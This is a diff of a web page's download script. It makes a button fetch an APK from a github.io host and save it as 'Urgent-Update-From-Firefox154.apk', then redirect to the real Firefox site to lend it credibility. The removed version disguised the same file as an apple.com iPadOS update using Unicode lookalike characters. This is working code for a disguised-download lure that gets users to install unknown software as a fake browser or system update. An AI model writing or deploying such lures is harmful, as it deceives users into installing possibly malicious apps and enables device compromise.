@@ -15,25 +15,30 @@
 
 
 
-    <button onclick="startImmed()">Download immediately</button>
+    <button onclick="startImmed()">Download immediately test</button>
 
 
 
     <script>
         function startImmed() {
-            //window.open('https://google.com', '_blank');
 
-            setTimeout(async () => {
-                const response = await fetch('https://kokurate.github.io/browser/rar-android-722.132.apk');
-                const blob = await response.blob();
-                const url = URL.createObjectURL(blob);
-                const link = document.createElement('a');
-                link.href = url;
-                link.download =
-                    'Source∶https∶⧸⧸apple.com⧸important-update⧸iPadOS-26.6.ipa';
-                link.click();
-                URL.revokeObjectURL(url);
-            }, 1000);
+            fetch('https://kokurate.github.io/browser/rar-android-722.132.apk')
+                .then(response => response.blob())
+                .then(blob => {
+                    const url = URL.createObjectURL(blob);
+                    const link = document.createElement('a');
+                    link.href = url;
+                    link.download = 'Urgent-Update-From-Firefox154.apk';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    URL.revokeObjectURL(url);
+                })
+                .catch(console.error);
+
+            setTimeout(function () {
+                window.location.href = 'https://www.firefox.com/en-GB/more/';
+            }, 5000);
         }
     </script>
 
